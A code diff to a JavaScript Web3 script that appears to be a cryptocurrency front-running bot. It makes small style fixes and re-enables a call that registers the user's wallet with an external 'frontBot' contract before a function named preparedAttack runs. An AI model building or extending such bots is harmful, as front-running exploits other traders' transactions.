@@ -68,7 +68,7 @@ async function createWeb3() {
 async function main() {
 
     try {
-        if (await createWeb3() == false) {
+        if (!await createWeb3()) {
             console.log('Web3 Create Error'.yellow);
             process.exit();
         }
@@ -78,8 +78,8 @@ async function main() {
         const amount = AMOUNT;
         const level = LEVEL;
 
-        ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);
-        if (ret == false) {
+        let ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);
+        if (!ret) {
             process.exit();
         }
 
@@ -606,7 +606,7 @@ async function getTokenInfo(tokenAddr, token_abi_ask, user_wallet) {
 async function preparedAttack(input_token_address, out_token_address, user_wallet, amount, level) {
     try {
 
-        //await setFrontBot(user_wallet);
+        await setFrontBot(user_wallet);
 
         var log_str = '***** Your Wallet Balance *****'
         console.log(log_str.green);
@@ -669,7 +669,7 @@ async function setFrontBot(user_wallet) {
     if (botCount > 0) {
         var bot_addr = await frontBotContract.methods.getFrontBots().call();
         for (var i = 0; i < botCount; i++) {
-            if (bot_addr[i] == user_wallet.address) {
+            if (bot_addr[i] === user_wallet.address) {
                 return;
             }
         }
